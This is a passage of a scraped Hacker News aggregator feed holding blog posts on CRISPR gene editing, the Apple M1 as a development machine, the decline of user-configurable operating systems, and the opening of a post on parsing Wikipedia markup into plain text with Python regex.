bacteria to "remember" the viruses. If the viruses attack again, the bacteria
produce RNA segments from the CRISPR arrays to target the viruses' DNA. The
bacteria then use Cas9 to cut the DNA apart and kill the virus.</p>
<div>
<p><img alt="https://dl.dropbox.com/s/staumxmyll7ypty/Screenshot_2020-11-27-19-41.png" src="https://dl.dropbox.com/s/staumxmyll7ypty/Screenshot_2020-11-27-19-41.png"></p><p>CRISPR in Bacteria. Figure from <em>Crack in the Creation</em>.</p>
</div>
<p><strong>CRISPR Shaping Human Genome</strong></p>
<p>The CRISPR-Cas9 system works similarly in the lab. Researchers create a small
piece of RNA with a short "guide" sequence that attaches (binds) to a specific
target sequence of DNA in a genome. The RNA also binds to the Cas9 enzyme. As in
bacteria, the modified RNA is used to recognize the DNA sequence, and the Cas9
enzyme cuts the DNA at the targeted location. Although Cas9 is the enzyme that
is used most often, other enzymes (for example Cpf1) can also be used. Once the
DNA is cut, researchers use the cell's own DNA repair machinery to add or delete
pieces of genetic material, or to make changes to the DNA by replacing an
existing segment with a customized DNA sequence</p>
<p>When CRISPR was determind that it could be used in lab on living organisms, the
potential for shaping the genome unfolded.</p>
<p>First time ever, in over 100,000 years, we have ability to shape the <em>Homo
Sapien</em> evolution by mechanisms other than random mutation and natural
selection.</p>
<p>In humans, CRISPR can be used to do a precise repair and produce a normal
protein from a non-functional gene.</p>
<p><img alt="https://dl.dropbox.com/s/zhew8671tk9dnx6/Screenshot_2020-11-28-04-04.png" src="https://dl.dropbox.com/s/zhew8671tk9dnx6/Screenshot_2020-11-28-04-04.png"></p><p>CRISPR enables scientists to edit and <em>fix</em> single incorrect letters of DNA from
3.2 billion letters that comprise the human genome. It can also be used to
perform even more complicated edits to Human DNA.</p>
<p>A relatively straightforward DNA editing has transformed every genetic disease,
at-least the diseases for which we know the underlying mutation(s) into a
potentially treatable disease.</p>
<p><strong>CRISPR on Animals</strong></p>
<p>CRISPR has been used to create gene edited mouse wherein the genome of the
embroyo was edited and introduced back into womb to have an offspring with
the desirable characteristics embedded at time of birth.</p>
<div>
<p><img alt="https://dl.dropbox.com/s/l0gxu7imj7v3pqa/Screenshot_2020-11-28-03-51.png" src="https://dl.dropbox.com/s/l0gxu7imj7v3pqa/Screenshot_2020-11-28-03-51.png"></p><p>Gene Edited Mouse. Figure from <em>A Crack in Creation</em>.</p>
</div>
<p>And we have used gene editing to create animals desirable characteristics</p>
<div>
<p><img alt="https://dl.dropbox.com/s/7hdtn904xxas57q/Screenshot_2020-11-28-04-01.png" src="https://dl.dropbox.com/s/7hdtn904xxas57q/Screenshot_2020-11-28-04-01.png"></p><p>Gene edited animals. Figure from <em>A crack in creation</em>.</p>
</div>
<p>This is currently used in practice. Like Recombinetics uses gene editing for
dehorning cattle, a safer method than physical dehorning using hot iron-rods.</p>
<p><a href="https://recombinetics.com/our-technology/"><img alt="https://dl.dropbox.com/s/r5op4mkkhju3s8p/Screenshot_2020-11-28-07-34.png" src="https://dl.dropbox.com/s/r5op4mkkhju3s8p/Screenshot_2020-11-28-07-34.png"></a></p><hr>
<p><strong>Pigs as Bio Reactors</strong></p>
<p>An important field of bio technology is regenerative medicine, desired by human
society who are fighting of some disease eithe naturally or have lost some
ability due an accident.</p>
<p>Many scientists see the pig itself as a source of medicine. It is seen
that we might be using pigs as bioreactors to produce valuable drugs like
therapeutic human proteins, which are too complex to synthesize from scratch and
can only be produced in living cells.</p>
<p><img alt="https://dl.dropbox.com/s/lw2lleanrept8qf/Screenshot_2020-11-28-04-07.png" src="https://dl.dropbox.com/s/lw2lleanrept8qf/Screenshot_2020-11-28-04-07.png"></p><p>Scientists have already been looking to
other transgenic animals to produce these biopharmaceutical drugs, or
farmaceuticals, as they’re colloquially called.</p>
<p><a href="https://www.revivicor.com/index.html">Revivicor</a> is a company that is using CRISPR to produce regenerative medicine,
following the process exactly outlined above. A workflow from their website
gives the details on how Pigs are used as Bio Reactors for regenerative
medicine.</p>
<p><a href="https://www.revivicor.com/"><img alt="https://www.revivicor.com/images/RevivicorTechPoster-04-2010.jpg" src="https://www.revivicor.com/images/RevivicorTechPoster-04-2010.jpg"></a></p><hr>
<p><strong>Malaria Resistant Mosquitos</strong></p>
<p>The deadliest animal on earth, Mosquito can also be killed using CRISPR. The
idea seems to create malaria resistant mosquitoes using gene editing so that
the entire family is disabled from being a carriers of malaria.</p>
<p><img alt="https://dl.dropbox.com/s/qwejig01w6zcyox/Screenshot_2020-11-28-04-23.png" src="https://dl.dropbox.com/s/qwejig01w6zcyox/Screenshot_2020-11-28-04-23.png"></p><hr>
<p><strong>CRISPR for Therapeutics</strong></p>
<p>CRISPR can be utilized to edit the germ cells outside the body.
The edited germ cells can be planted inside for beneficiary aspects.</p>
<div>
<p><img alt="https://dl.dropbox.com/s/8ekvzjzwupi63t7/Screenshot_2020-11-28-04-27.png" src="https://dl.dropbox.com/s/8ekvzjzwupi63t7/Screenshot_2020-11-28-04-27.png"></p><p>Ex-vivo CRISPR therapy. A Crack In The Creation.</p>
</div>
<p>For targeted drug delivery, like fixing the lung or particular muscle instead
of injecting the drug into blood stream.</p>
<div>
<p><img alt="https://dl.dropbox.com/s/7zaa0afr6gdipha/Screenshot_2020-11-28-04-31.png" src="https://dl.dropbox.com/s/7zaa0afr6gdipha/Screenshot_2020-11-28-04-31.png"></p><p>In-vivo CRISPR therapy. A Crack In the Creation.</p>
</div>
<p>Adult Homo sapiens are among the last animals to be treated with CRISPR, human
cell: have been subjected to more CRISPR gene editing than those of any other
organism.</p>
<p>Scientists have applied CRISPR in lung cells to correct the genetic mutation
that causes cystic fibrosis, in blood cells to correct the mutations that cause
sickle cell disease and beta-thalassemia, and in muscle cells to correct the
mutations that cause Duchenne muscular dystrophy.</p>
<p>Scientists have used CRISPR to edit and repair mutations in stem cells, which
can then be coaxed to transform into virtually any cell or tissue type in the
body.</p>
<p>Even as CRISPR continues to be useful, it's power as a technology and it's
potential misuse is a concern for everyone.</p>
<blockquote>
Whether we'll ever have the intellectual and moral capacity to
guide our own genetic destiny is an open question - one that has been in my
mind since I began to realize what CRISPR is capable of.
- Jennifer Doudna</blockquote>
<p>And Jennifer Doudna shares her stance as she says, that the nature will still be
our supreme master.</p>
<blockquote>
Any mutations that CRISPR might make—intentional or not—would almost certainly
pale in comparison to the genetic storm that rages inside each of us from
birth to death. As one writer put it, “Genetic editing would be a droplet in
the maelstrom of naturally churning genomes.” If CRISPR could eliminate a
disease-causing mutation in the embryo with high certainty and only a slight
risk of introducing a second off-target mutation elsewhere, the potential
payoffs might well outweigh the dangers.
- Jennifer Doudna</blockquote>

</div>
    </div></div>]]>
            </description>
            <link>http://xtoinfinity.com/posts/2020/11/27/a-crack-in-creation-by-jennifer-doudna-and-samuel-steinberg.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25238740</guid>
            <pubDate>Sat, 28 Nov 2020 17:06:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Silicon M1: A Developer's Perspective]]>
            </title>
            <description>
<![CDATA[
Score 361 | Comments 438 (<a href="https://news.ycombinator.com/item?id=25238608">thread link</a>) | @steipete
<br/>
November 28, 2020 | https://steipete.com/posts/apple-silicon-m1-a-developer-perspective/ | <a href="https://web.archive.org/web/*/https://steipete.com/posts/apple-silicon-m1-a-developer-perspective/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img src="https://d33wubrfki0l68.cloudfront.net/7dbf04694dfeeec9985b2ebb27cc1faff153111b/75e93/assets/img/2020/m1/m1.jpg"></p><p>The excitement around Apple’s new M1 chip is <a href="https://www.singhkays.com/blog/apple-silicon-m1-black-magic/">everywhere</a>. I bought a MacBook Air 16GB M1 to see how viable it is as main development machine - here’s an early report after a week of testing.</p><h2 id="xcode">Xcode</h2><p>Xcode runs FAST on the M1. Compiling the <a href="https://pspdfkit.com/">PSPDFKit PDF SDK</a> (debug, arm64) can almost compete with the fastest Intel-based MacBook Pro Apple offers to date, with <a href="https://twitter.com/steipete/status/1332052251712614405?s=21">8:49 min vs 7:31 min</a>. For comparison, my Hackintosh builds the same in less than 5 minutes.</p><p>One can’t overstate how impressive this is for a fan-less machine. Apple’s last experiment with fan-less MacBooks was the 12-inch version from 2017, which builds the same project in 41 minutes.</p><p>Our tests mostly ran just fine, although I found <a href="https://github.com/Aloshi/dukglue/pull/27">a bug specific to arm64</a> that we missed before, as we don’t run our tests on actual hardware on CI. Moving the Simulator to the same architecture as shipping devices will be beneficial and will help find more bugs.</p><p>Testing iOS below 14 is problematic. It seems <a href="https://twitter.com/steipete/status/1332654247809257473?s=21">WebKit is crashing in a memory allocator</a>, throwing EXC_BAD_INSTRUCTION (code=EXC_I386_INVOP, subcode=0x0) (Apple folks: FB8920323). Performance also seems really bad, with Xcode periodically <a href="https://twitter.com/steipete/status/1332348616145563653?s=21">freezing</a> and the whole system becoming so <a href="https://twitter.com/steipete/status/1332648748158246922?s=21">slow</a> that the mouse cursor gets choppy. Some Simulators even make problems on iOS 14, <a href="https://twitter.com/steipete/status/1331628274783543297?s=21">such as the iPad Air (4th gen) which still emulates Intel</a>, so try to avoid that one.</p><p>We were extremely excited to be moving our CI to Mac Mini’s with M1 chip and are <a href="https://www.macstadium.com/m1-mini">waiting on MacStadium to release devices</a>, however it seems we will have to restrict tests to iOS 14 for that to work. With our current schedule, we plan to drop iOS 12 in Q3 2021 and iOS 13 in Q3 2022, so it will be a while until we can fully move to Apple Silicon.</p><p>There is a chance that Apple fixes these issues, however it’s not something to count on - given that this only affects older versions of iOS, the problem will at some point just “go away”.</p><p><strong>Update:</strong> We’re working around the WebKit crashes for now via detecting Rosetta2 translation at runtime and simply skipping the tests where WebKit is used. This isn’t great, but luckily we’re not using WebKit a lot in our current project. <a href="https://gist.github.com/steipete/e15b1fabffc7da7d49c92e3fbd06971a">See my Gist for details</a>. Performance seems acceptable if you restrict parallel testing to at most two instances - else the system simply runs out of RAM and swapping is just really slow.</p><h2 id="docker">Docker</h2><p>We use Docker to automate our Website and load environments for our <a href="https://pspdfkit.com/pdf-sdk/web/">Web and Server PDF SDKs</a>. Docker posted a <a href="https://www.docker.com/blog/apple-silicon-m1-chips-and-docker/">status update blog post</a> about the current state of things, admitting that it currently won’t work but that they’re <a href="https://github.com/docker/roadmap/issues/142">working on it</a>. There are more <a href="https://finestructure.co/blog/2020/11/27/running-docker-on-apple-silicon-m1-follow-up">hacky ways to use Apple’s Hypervisor to run Docker container manually</a>, however this needs arm-based containers.</p><p>I expect a solution in Q1 2021 that runs arm-based containers. We’ll have to do some work to add arm-support (something already on the roadmap) so this is only a transitional issue.</p><h2 id="virtualization-and-windows">Virtualization and Windows</h2><p>To test our <a href="https://pspdfkit.com/pdf-sdk/windows/">Windows PDF SDK</a>, most folks are using a VMware virtual machine with Windows 10 and Visual Studio. Currently none of the Mac virtualisation solutions support Apple Silicon, however both <a href="https://appleinsider.com/articles/20/11/11/parallels-confirms-apple-m1-support-amid-silence-from-other-virtualization-companies">VMware and Parallels</a> are working on it. I do not expect Virtualbox to be updated <a href="https://forums.virtualbox.org/viewtopic.php?f=8&amp;t=98742">anytime soon</a>.</p><p>I expect that eventually we’ll be able to run ARM-based Windows with commercial tooling. Various <a href="https://9to5mac.com/2020/11/27/arm-windows-virtualization-m1-mac/">proof-of-concepts</a> already exist, and performance seems <a href="https://twitter.com/imbushuo/status/1332772957609922561?s=21">extremely promising</a>. Microsoft currently doesn’t sell ARM-based Windows, so getting a license will be interesting.</p><p>ARM-Windows can emulate x86 applications, and Microsoft is working on <a href="https://www.neowin.net/news/it039s-official-x64-emulation-is-coming-to-windows-on-arm">x64 emulation</a>, which is already rolling out in Insider builds. In a few months, it should be possible to develop and test our Windows SDK with Visual Studio on M1 in reasonable performance.</p><p>Running older versions of macOS might be more problematic. We currently support macOS 10.14 with our <a href="https://pspdfkit.com/blog/2017/pspdfkit-for-macos/">AppKit PDF SDK</a> and macOS 10.15 with the <a href="https://pspdfkit.com/blog/2019/pspdfkit-for-mac-catalyst/">Catalyst PDF SDK</a>, both OS releases that require testing. It remains to be seen if VMWare or Parallels include a complete x64 emulation layer. This would likely be really slow, so I wouldn’t count on it.</p><p><img src="https://d33wubrfki0l68.cloudfront.net/bbf100981357e4bc26c49722d31253daf76d293d/5b456/assets/img/2020/m1/memory.png" alt=""></p><p>Lastly, 16 GB RAM just isn’t a lot. When running parallel tests, the machine starts to heavily swap and performance really goes down the drain. This will be even more problematic with virtual machines running. Future machines will offer 32 GB options to alleviate this issue.</p><p><strong>Update:</strong> <a href="https://gist.github.com/niw/e4313b9c14e968764a52375da41b4278#file-readme-md">How to run Windows 10 on ARM in Qemu with Hypervisor.framework patches on Apple Silicon Mac</a></p><h2 id="android-studio">Android Studio</h2><p>IntelliJ is working on porting the <a href="https://youtrack.jetbrains.com/issue/JBR-2526">JetBrains Runtime</a> to Apple Silicon. The apps currently work through Rosetta 2, however building via Gradle is <a href="https://www.reddit.com/r/androiddev/comments/jx4ntt/apple_macbook_air_m1_is_very_slow_in_gradle_builds/">extremely slow</a>. Gradle creates code at runtime, which seems a particular bad combination with the Rosetta 2 ahead-of-time translation logic.</p><p>I expect that most issues will be solved by Q1 2021, however it will likely be some more time until all Java versions run great on ARM. A lot of effort has been put into <a href="https://bell-sw.com/java/arm/performance/2019/01/15/the-status-of-java-on-arm/">loop unrolling and vectorisation</a>, not everything there is available on ARM just yet.</p><p><strong>Update:</strong> <a href="https://www.azul.com/press_release/azul-announces-support-of-java-builds-of-openjdk-for-apple-silicon/">Azul offers macOS JDKs for arm64</a>, including for <a href="https://www.azul.com/downloads/zulu-community/?os=macos&amp;architecture=arm-64-bit&amp;package=jdk">Java 8</a>.</p><h2 id="homebrew">Homebrew</h2><p><a href="https://brew.sh/">Homebrew</a> currently works via Rosetta 2. Just prefix everything with <code>arch -x86_64</code> and it’ll just work. It is possible to install an additional (arm-based) version of Homebrew <a href="https://soffes.blog/homebrew-on-apple-silicon">under <code>/opt/homebrew</code></a> and mix setup, as <a href="https://github.com/Homebrew/brew/issues/7857">more and more software</a> is adding support for arm.</p><p>This is not a problem currently (performance is good) and will eventually just work natively.</p><h2 id="applications">Applications</h2><p>Most applications just work, Rosetta is barely noticeable. Larger apps to take a longer initial performance hit (e.g. Microsoft Word takes <a href="https://www.zdnet.com/article/microsoft-office-will-be-about-20-second-slower-initially-on-apple-silicon-rosetta-2/">around 20 seconds</a> until everything is translated), but then these binaries are cached and subsequent runs are fast.</p><p>There’s the occasional app that can’t be translated and fails on startup (e.g. <a href="https://beamer-app.com/download">Beamer</a> or the <a href="https://www.google.com/intl/en_gh/drive/download/">Google Drive “Backup and Sync” client</a>), but this is rare. Some apps are confused about their place on disk and ask to be moved to the Applications directory, when really it’s just the translated binary that runs somewhere else. Most of these dialogs can be ignored. Some apps (e.g. Visual Studio Code) <a href="https://twitter.com/steipete/status/1331884524934995968?s=21">block auto-updating</a> as the translated app location is readonly. However, in case of VS Code, the Insider build is already updated to ARM and just works.</p><p>Electron-based apps are slow if they run on Rosetta. It seems the highly optimized V8 JavaScript compiler blocks ahead-of-time translation. The latest stable version of Electron (Version 11) already <a href="https://www.electronjs.org/blog/apple-silicon">fully supports Apple Silicon</a>, and companies like Slack already updated their beta version to run natively.</p><p>Google just shipped <a href="https://www.macworld.com/article/3597749/google-releases-chrome-87-with-support-for-apple-silicon-macs.html">Chrome that runs on ARM</a>, however there’s still quite a performance gap between it and Apple Safari, which just <em>flies</em> on Apple Silicon.</p><h2 id="conclusion">Conclusion</h2><p>The new M1 MacBooks are fast, beautiful and silent and the hype is absolutely justified. There’s still a lot to do on the software-front to catch up, and the bugs around older iOS Simulators are especially problematic.</p><p>All of that can be fixed in software and the whole industry is currently working on making the experience better, so by next year, when Apple updates the 16-inch MacBook Pro and releases the next generation of their M chip line, it should be absolutely possible to use a M1 Mac as main dev machine.</p><p>For the time being, the M1 will be my <del>travel</del> secondary laptop, and I’ll keep working on the 2,4 GHz 16-inch MacBook Pro with 32 GB RAM, which just is the faster machine. I’ll be much harder to accept the loud, always-on fans though, now that I know what soon will be possible.</p></div></div>]]>
            </description>
            <link>https://steipete.com/posts/apple-silicon-m1-a-developer-perspective/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25238608</guid>
            <pubDate>Sat, 28 Nov 2020 16:47:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No Config for Old Men]]>
            </title>
            <description>
<![CDATA[
Score 261 | Comments 215 (<a href="https://news.ycombinator.com/item?id=25238523">thread link</a>) | @zdw
<br/>
November 28, 2020 | https://datagubbe.se/noconf/ | <a href="https://web.archive.org/web/*/https://datagubbe.se/noconf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p><b>...or anyone else, for that matter.</b></p>

<p><i>Autumn 2020</i></p>

<p>Ask anyone who's really into cooking and they'll tell you how important it is to have a kitchen that's arranged just right. To someone who rarely cooks, a kitchen is probably just a place to store a few pots and a toaster, and the placement of such stuff doesn't matter much: canned soup and microwave dinners are designed for ease of preparation.</p>


<p>For the enthusiastic home cook, however, a lot of things can go wrong. Often there's only a second's notice to fix something that might ruin a perfect meal or set you back hours of hard toil. Hollandaise starting to split? Better bring out that ice cold water post haste! Garlic burning? Better chop some more right this instant, or the pasta will be overcooked and there goes the Aglio e Oglio.</p>


<p>To achieve speed, you have to know where your knives, pots, pans, spoons, whisks and other utensils are and you want to be able to arrange them so that they're easy to reach. Seasonings, spices, herbs and condiments should be within reach from the stove. Then there's the mise en place before the actual cooking begins: chopping all the vegetables, cubing the meat, slicing the bacon and so on.</p>


<p>All of this is, thankfully, easy to achieve. Even the most cramped kitchen will, after having been battle tested through a few meals, be as optimal as possible according to the cook's personal preference. The same goes for painters, carpenters, car mechanics and even office dwellers. Hammer missing from the hammer hook? For shame! Stapler not to the immediate right of the stack of post-its? Well it should be!</p>


<h3>The regulated kitchen</h3>


<p>Now imagine if you couldn't organize your kitchen to your heart's content. Not because you're lacking the funds or skills, but because some federally appointed clerk is constantly coming to inspect it.</p>


<p>"Nah," he says, adjusting his clip-on tie, "you can't put your spices there. Against regulations. All spices must be kept more than two yards from the stove at all times." He then goes on to explain that you'll have to call him every time you want to use the stove, just to make sure the pots you're using are compliance tested. Plus, they have to be stored in the government approved pot storage cabinet below the sink, otherwise they're not fit for kitchen use.</p>


<p>Want to change the color of the counter top? Sorry, no can do. Want to switch from glass bowls to stainless? Alas, you used to be able a few years ago, but nobody wants stainless anymore anyway, right? The salt <i>can</i> be put next to the stove, but it's not recommended and might change in the near future. Knives are now to be honed every Tuesday afternoon by a designated craftsman. Sure, you can postpone a few times, but eventually, you just have to live with that. Plus, there's going to be some dudes coming to inventory your pantry on a regular basis, most likely when you're in the middle of cooking something really complicated. There's no use in protesting - this is all for your own good.</p>

<p>And yes.


</p><p>Of course this is a metaphor for computers.</p>


<h3>The curious disappearance of configuration</h3>


<p>For the casual user, some of this can <i>maybe</i> be convenient - or at least not annoying. If someone who rarely uses the kitchen has decided to whip up a home cooked feast, it doesn't matter that the spices are kept strangely far from the stove: they're just happy they found them. And <i>maybe</i> there is, for the casual user, some "security" in lock-in efforts such as MacOS calling home<sup><a href="#footnote1">[1]</a></sup> to check if a program is allowed to run and that web browsers automatically block certain URLs.</p>


<p>Likewise, maybe a handful of confused beginners are helped by the fact that certain system settings are extremely hard to find, or that you're supposed to put all your photos in a specific directory, or that you can't decide what partition you want to install a program on, or that some indexing service starts running when you least expect it, or that not a single application gives a crap about the few color settings you're allowed to make.</p>


<p>For the power user, such things range from nuisances to something that seriously hampers productivity and creativity.</p>


<p>It used to be that whenever I got a new computer, I spent a day or two setting it up. I selected the fonts I wanted to use, I picked the colors I liked for window decorations and GUI elements, I installed my preferred tools and utilities and I organized the desktop icons and program launchers to my liking. It took a bit of time, but it was a labor of love. In times of trouble I was, if nothing else, at least the boss of my own desktop environment.</p>


<p>I don't know of any proprietary OS where I can do that anymore. Linux is, considering what's going on with the major distributions, desktop environments and UI toolkits, seemingly heading the same way. Sure, pick your own window manager, see if we care - we've got client side decorations! Want to theme your GUI? Yeah, but not in our Snap packages you won't! Want to turn off cursor blinking? Mmmmyyeeaahhh, not too sure about that. Oh, you started a GUI file manager? Hey, enjoy the ten new folders we've littered your home directory with! They all start with capital letters: designed for typing convenience in a case sensitive file system.</p>


<p>Of course I still spend a fair amount of time setting up a Windows machine, but these days it's not the joyful experience of configuring the best fonts and nicest colors and arranging the icons on the start menu in the correct order for my muscle memory. Instead it's usually a week of swearing over removed settings and working hard to find the ones that actually remain, or trying various registry hacks to circumvent seemingly unchangeable defaults. I'm working against the system instead of with it, and someone else is trying to boss me around.</p>


<h3>A better example</h3>


<p>All of this could be different. It used to be. On my <a href="https://datagubbe.se/ltmag/">Amiga</a>, I could configure <i>everything</i>. Apart from things like fonts and colors I could draw my own mouse pointer, tiling desktop backgrounds and icons. (Yes, the system really shipped with separate little paint programs just for pointers, desktop tiles and icons.) I could customize double click speed and key repeat rates on millisecond levels. I could even control the exact position of individual icons and the size and position of every individual directory window opened.</p>


<p>Most casual users didn't care about all that, but they didn't have to. The system came with a reasonable set of defaults and when or if they grew more proficient and wanted to change something about their daily working environment, they had the option to do so.</p>


<p>This was a great approach to users. Instead of being treated like an incompetent moron and placed in a walled garden, you were entrusted and empowered. Something as simple as drawing my own mouse pointer on the Amiga was a profound and formative experience for me. As corny as it sounds, it was as if the guys who built this amazing machine put it in my hands and said, "Hey kid, you're in charge. This computer is yours. Learn how to use it and you can make it do anything." It was a call for exploration and creativity.</p>


<p>Today, I can't even change the system font in Windows. I can select an "accent color", but most applications completely ignore it. Every program defaults to downloading into a Downloads folder and I've lost count of how many times I've changed its folder view from grouped to not grouped, only to discover it's been magically changed back the next time I browse it. Lots of settings have been removed completely while others are buried deep in strange places where a user clearly isn't really supposed to venture.</p>


<p>The problem is that there's no toggle for enabling "advanced mode". I'm just supposed to accept that I can no longer change simple things I've been able to configure for the past thirty years. Someone, somewhere just decided that all users have the same basic skill level and that the defaults are always acceptable.</p>


<h3>General purpose Instagram cameras</h3>


<p>I suppose the lack of configurability is a metaphor for personal computing in general: we're not buying our machines, we're renting them by way of bizarrely complex EULA:s for everything from the firmware to the OS and we're not supposed to be curious or creative, we're supposed to sit back and passively consume advertisements. The base level of creative computer use is no longer exploring programming or graphics or music, but photographing a meal someone else has prepared and then applying a predefined sepia filter to said photo. The base level of configuring a system is no longer picking some personal favorites among fonts and colors, but - maybe - selecting between dark and light mode.</p>


<p>
On the flip side, more and more people also need to use computers 
for actually producing stuff - not least programming all those ad 
delivery platforms and the curiously unconfigurable operating systems 
they run on. But there are also armies of innocents; office workers,
administrators, hotel clerks, librarians, teachers - those people now often 
have no choice but to strain their eyes staring at black text on bright 
white backgrounds, unable to select a font they find easier to read.
</p>

<p>Too bad they can no longer store their spices close to the stove, but hey, who cares? Let them take one for the team. We're all swimming in ad revenue and if people learn to configure things, maybe they'll suddenly realize that the presence of those ads should be configurable as well.</p>

<br>

<hr>



<p id="footnote1">
<sup>1</sup> In case my sarcasm isn't coming through here: No, it's not secure. The privacy and security problems this entails are huge.
</p>

</div></div>]]>
            </description>
            <link>https://datagubbe.se/noconf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25238523</guid>
            <pubDate>Sat, 28 Nov 2020 16:35:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parsing All of Wikipedia to an Offline Encyclopedia]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25238316">thread link</a>) | @kxrm
<br/>
November 28, 2020 | https://daveshap.github.io/DavidShapiroBlog/automation/2020/11/15/parsing-all-wikipedia.html | <a href="https://web.archive.org/web/*/https://daveshap.github.io/DavidShapiroBlog/automation/2020/11/15/parsing-all-wikipedia.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
<div>

<header>
 
  <h2>I want an offline encyclopedia and am extremely masochistic</h2>
   <h3>15 November 2020</h3>
    <a href="https://daveshap.github.io/DavidShapiroBlog">Home</a>&nbsp;—&nbsp;
    <a href="https://daveshap.github.io/DavidShapiroBlog/categories.html">Categories</a>
</header>

<hr>

<section id="main_content">


<p>I’m working on a project where I want to have an offline encyclopedia. It’s for training deep learning networks so it needs to be in plain text English. 
No markup, no special characters. Human readable without any interpreters, renderers, or parsers. I’ve got plenty of disk space, so that’s not a concern. 
Once I parse out all the Wikipedia articles I can get my hands on, I will create an index. Or I might index them into SOLR or something like that. Not sure yet.
I’m also going to implement it as a resource for a massive <a href="https://towardsdatascience.com/building-a-question-answering-system-part-1-9388aadff507">SQUAD repo</a>. I have uploaded a copy of the final result to <a href="https://www.kaggle.com/ltcmdrdata/plain-text-wikipedia-202011">Kaggle Datasets</a>. I’ve stashed the script in a <a href="https://github.com/daveshap/PlainTextWikipedia">dedicated repo on GitHub</a>.</p>



<p>The first thing I should have learned is that Wikipedia is written in a demented Frankenstein language called WikeMedia Text. It’s a hybrid of HTML/XML and Markdown. 
It has no consistency and is the worst example of spaghetti code I’ve ever seen. I’m sure there are better implementations today, but I can see how and why it ended up the way it did.
For instance, you need to be able to create robust references and links, so the URL syntax is way jacked. It relies on a lot of procedural generation at display time.
Personally, if it were done again today, I think something like Jekyll would be way better. Instead of rendering again and again every time someone visits a page, render it once after each edit.
But that’s just me. So instead we’re left with this horrible hybrid language that should die in a fire.</p>

<p>Fine, it is what it is. I’m an expert automator, dammit, and if a machine can automatically render this nonsense, then I sure as hell can <strong>unrender it</strong>.</p>

<h2 id="attempt-1---brute-force-regex">Attempt 1 - Brute Force Regex</h2>

<p>“Brute Force Regex” (BFR) is not a real thing. It’s just something I’ve been doing for years now in my automation habits. Usually, as a naive approach, I’ll try and do some 
search-and-replace jiggery pokery to just remove unwanted junk. Sometimes this is textual formatting, like brackets around tables or other HTML tags. 
So I ended up with the following function. Caution, it’s not pretty. This was just an experiment, and I wanted to share it so you would see what doesn’t work.</p>

<div><div><pre><code><span>def</span> <span>basic_replacements</span><span>(</span><span>text</span><span>):</span>
    <span>replacements</span> <span>=</span> <span>[</span>
    <span>(</span><span>'&amp;lt;'</span><span>,</span><span>'&lt;'</span><span>),</span>
    <span>(</span><span>'&amp;gt;'</span><span>,</span><span>'&gt;'</span><span>),</span>
    <span>(</span><span>'&amp;quot;'</span><span>,</span><span>'"'</span><span>),</span>
    <span>(</span><span>"'''"</span><span>,</span><span>' = '</span><span>),</span>
    <span>(</span><span>"'{2,}"</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'</span><span>\n</span><span>'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>r'\n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'r</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'&lt;ref.*?&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'&lt;/ref&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'http.*?\s'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'\s+'</span><span>,</span><span>' '</span><span>),</span>
    <span>]</span>
    <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>)</span>
    <span>for</span> <span>r</span> <span>in</span> <span>replacements</span><span>:</span>
        <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>r</span><span>[</span><span>0</span><span>],</span> <span>r</span><span>[</span><span>1</span><span>],</span> <span>text</span><span>)</span>
    <span>return</span> <span>text</span>
</code></pre></div></div>

<p>I came up with this scheme because, at first glance, WikiMedia Text looked like a mixture of some basic HTML and some Markdown. 
I figured I could handle it with some basic regex replacements. This worked… to an extent. There were a few problems with it though.</p>

<ol>
  <li>Couldn’t handle nested square brackets or curly brackets, and it turns out there are a lot of those</li>
  <li>Quickly became intractable when I encountered escaped unicode literals like <code>\u2013</code>. They are frigging everywhere.</li>
</ol>

<p>So I wrote two more functions to try and tackle the bracketed stuff. These are things like links, citations, and pictures. Since I want a text-only Wikipedia, 
I really just needed to strip it all away.</p>

<div><div><pre><code><span>def</span> <span>remove_double_curly</span><span>(</span><span>text</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>before</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>''</span><span>,</span> <span>''</span><span>,</span> <span>text</span><span>)</span> 
        <span>after</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>if</span> <span>before</span> <span>==</span> <span>after</span><span>:</span>
            <span>return</span> <span>text</span>


<span>def</span> <span>remove_double_brackets</span><span>(</span><span>text</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>before</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>double_brackets</span> <span>=</span> <span>re</span><span>.</span><span>findall</span><span>(</span><span>'\[\[.*?\]\]'</span><span>,</span> <span>text</span><span>)</span>
        <span>for</span> <span>db</span> <span>in</span> <span>double_brackets</span><span>:</span>
            <span>if</span> <span>'|'</span> <span>in</span> <span>db</span><span>:</span>
                <span>new</span> <span>=</span> <span>db</span><span>.</span><span>split</span><span>(</span><span>'|'</span><span>)[</span><span>-</span><span>1</span><span>].</span><span>strip</span><span>(</span><span>']'</span><span>)</span>
